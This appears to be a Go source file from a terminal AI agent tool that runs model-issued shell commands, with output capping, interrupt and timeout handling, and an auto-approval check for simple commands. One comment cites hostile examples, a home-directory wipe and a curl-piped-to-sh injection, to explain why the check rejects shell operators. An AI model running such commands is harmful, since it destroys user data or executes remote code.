package main

import (
	"fmt"
	"io"
	"os"
	"os/exec"
	"os/signal"
	"strings"
	"syscall"
	"time"
	"unicode/utf8"
)

const (
	// Аварийный потолок на буфер вывода. Пользователь просил отдавать
	// модели вывод целиком, поэтому лимит выбран заведомо выше любого
	// осмысленного вывода — он тут только чтобы `cat /dev/urandom` не
	// съел память процесса.
	maxToolOutputBytes = 10 << 20

	// Щедрый потолок на выполнение: make, rsync и dd легально идут
	// минутами. Реальное средство от зависаний — Ctrl-C (см. execShell).
	defaultExecTimeout = 10 * time.Minute
)

// cappedWriter копит вывод целиком, пока он влезает в лимит; при
// переполнении сохраняет голову и хвост, выбрасывая середину — для
// сборок и логов интересен именно конец, а для команд вроде find —
// начало. Write всегда рапортует об успехе целиком, иначе io.MultiWriter
// вернёт ErrShortWrite и оборвёт выполнение команды на середине.
type cappedWriter struct {
	head    []byte
	tail    []byte
	limit   int
	total   int
	dropped int
}

func (c *cappedWriter) Write(p []byte) (int, error) {
	n := len(p)
	c.total += n
	half := c.limit / 2

	if len(c.head) < half {
		take := half - len(c.head)
		if take > len(p) {
			take = len(p)
		}
		c.head = append(c.head, p[:take]...)
		p = p[take:]
	}
	if len(p) > 0 {
		c.tail = append(c.tail, p...)
		if over := len(c.tail) - half; over > 0 {
			c.tail = c.tail[over:]
			c.dropped += over
		}
	}
	return n, nil
}

func (c *cappedWriter) String() string {
	if c.dropped == 0 {
		return string(c.head) + string(c.tail)
	}
	// Обрезаем по границам символов: срез по байтам разрубает
	// двухбайтовую кириллицу пополам и отдаёт модели мусор.
	head := trimPartialRuneRight(c.head)
	tail := trimPartialRuneLeft(c.tail)
	return fmt.Sprintf("%s\n...(пропущено примерно %d байт середины вывода)...\n%s",
		head, c.dropped, tail)
}

func trimPartialRuneRight(b []byte) string {
	for len(b) > 0 {
		if r, _ := utf8.DecodeLastRune(b); r != utf8.RuneError {
			break
		}
		b = b[:len(b)-1]
	}
	return string(b)
}

func trimPartialRuneLeft(b []byte) string {
	for len(b) > 0 {
		if r, _ := utf8.DecodeRune(b); r != utf8.RuneError {
			break
		}
		b = b[1:]
	}
	return string(b)
}

type execResult struct {
	output      string
	exitCode    int
	interrupted bool
	timedOut    bool
}

// execShell выполняет команду через sh -c.
//
// Ctrl-C гасит команду, а не clank: SIGINT прилетает всей группе процессов,
// то есть и потомку тоже, а clank его перехватывает и не умирает. Так
// зависший `tail -f` прибивается без потери сессии. Специально НЕ уводим
// потомка в отдельную группу — иначе он окажется фоновым для терминала и
// любое чтение с tty (пароль sudo) повесит его по SIGTTIN.
//
// stdin потомка — управляющий терминал, чтобы sudo мог спросить пароль
// даже когда основной stdin занят пайпом с контекстом.
func execShell(command string, timeout time.Duration) execResult {
	capped := &cappedWriter{limit: maxToolOutputBytes}
	// вывод идёт одновременно в stdout (юзер видит его вживую, в том
	// числе у долгих команд) и в буфер, который уйдёт обратно в модель
	w := io.MultiWriter(os.Stdout, capped)

	cmd := exec.Command("sh", "-c", command)
	cmd.Stdout = w
	cmd.Stderr = w
	if f, _, err := ttyIO(); err == nil {
		cmd.Stdin = f
	}

	if err := cmd.Start(); err != nil {
		return execResult{output: "не удалось запустить: " + err.Error(), exitCode: -1}
	}

	sigc := make(chan os.Signal, 1)
	signal.Notify(sigc, os.Interrupt)
	defer signal.Stop(sigc)

	done := make(chan error, 1)
	go func() { done <- cmd.Wait() }()

	timer := time.NewTimer(timeout)
	defer timer.Stop()

	res := execResult{}
	var waitErr error

	select {
	case waitErr = <-done:

	case <-sigc:
		// SIGINT уже получен потомком вместе с нами (общая группа).
		// Ждём, пока он умрёт; если упрямится — добиваем.
		res.interrupted = true
		signal.Stop(sigc) // следующий Ctrl-C должен завершать clank как обычно
		select {
		case waitErr = <-done:
		case <-time.After(3 * time.Second):
			_ = cmd.Process.Kill()
			waitErr = <-done
		}

	case <-timer.C:
		res.timedOut = true
		warn("команда идёт дольше %s — снимаю", timeout)
		_ = cmd.Process.Signal(syscall.SIGTERM)
		select {
		case waitErr = <-done:
		case <-time.After(5 * time.Second):
			_ = cmd.Process.Kill()
			waitErr = <-done
		}
	}

	res.exitCode = 0
	if waitErr != nil {
		if exitErr, ok := waitErr.(*exec.ExitError); ok {
			res.exitCode = exitErr.ExitCode()
		} else {
			res.exitCode = -1
		}
	}
	res.output = capped.String()
	return res
}

// --- разрешённые команды ---

// commandName — первое слово команды, по нему работает список
// разрешённых. Ведущие присваивания переменных (FOO=bar cmd) пропускаем,
// иначе `FOO=1 ls` считался бы командой "FOO=1".
func commandName(command string) string {
	for _, f := range strings.Fields(command) {
		if strings.Contains(f, "=") && !strings.HasPrefix(f, "=") {
			continue
		}
		if i := strings.LastIndex(f, "/"); i >= 0 {
			f = f[i+1:]
		}
		return f
	}
	return ""
}

// isSimpleCommand — можно ли доверять первому слову как имени команды.
// Строка уходит в sh -c, поэтому «начинается на ls» ничего не гарантирует:
// `ls; rm -rf ~` и `ls $(curl evil | sh)` тоже начинаются на ls. Разрешаем
// автоподтверждение только для строк без операторов, перенаправлений и
// подстановок. Это проверка набора символов, а не разбор грамматики шелла —
// всё сомнительное просто уходит на ручное подтверждение.
func isSimpleCommand(command string) bool {
	if strings.ContainsAny(command, ";&|<>\n\r(){}") {
		return false
	}
	if containsAny(command, "$(", "${", "`", "$((") {
		return false
	}
	return true
}
